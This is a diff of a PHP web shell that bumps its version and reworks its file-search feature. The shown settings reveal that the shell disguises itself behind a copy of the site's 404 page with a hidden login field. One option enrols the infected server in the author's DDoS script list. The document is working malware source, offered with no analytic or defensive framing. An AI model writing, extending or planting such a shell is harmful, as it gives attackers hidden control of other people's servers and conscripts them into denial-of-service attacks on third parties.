@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 2.83;
+$version            = 2.85;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -978,20 +978,24 @@ function shownav(e){
     } else {
         $dirs = @opendir($dir);
         while ($file = @readdir($dirs)) {
-            if ($findstr && in_array(getext($file), explode(',', $writabledb))){
+            if ($findstr){
+                if (!in_array(getext($file), explode(',', $writabledb))) continue;
+                if (@is_dir($nowpath . $file)) continue;
                 $infile = ($findin == "Find in File Content");
                 if ($re){
-                    if (!$prgm('@' . $findstr . '@', $file) && !($infile && $prgm('@' . $findstr . '@', @file_get_contents($nowpath . $file)))) {
-                        continue;
+                    if ($infile){
+                        if (!$prgm('@' . $findstr . '@', @file_get_contents($nowpath . $file))) continue;
+                    }else{
+                        if (!$prgm('@' . $findstr . '@', $file)) continue;
                     }
-                    
                 }else{
-                    if (!strstr($file, $findstr) && !($infile && strstr(@file_get_contents($nowpath . $file), $findstr))) {
-                        continue;
+                    if ($infile){
+                        if (!(strpos(@file_get_contents($nowpath . $file), $findstr) !== FALSE)) continue;
+                    }else{
+                        if (!(strpos($file, $findstr) !== FALSE)) continue;
                     }
                 }
             }
-            if ($findstr && @is_dir($nowpath . $file)) continue;
             $filepath = $nowpath . $file;
             if (@is_dir($filepath)) {
                 $dirdb['filename']    = $file;
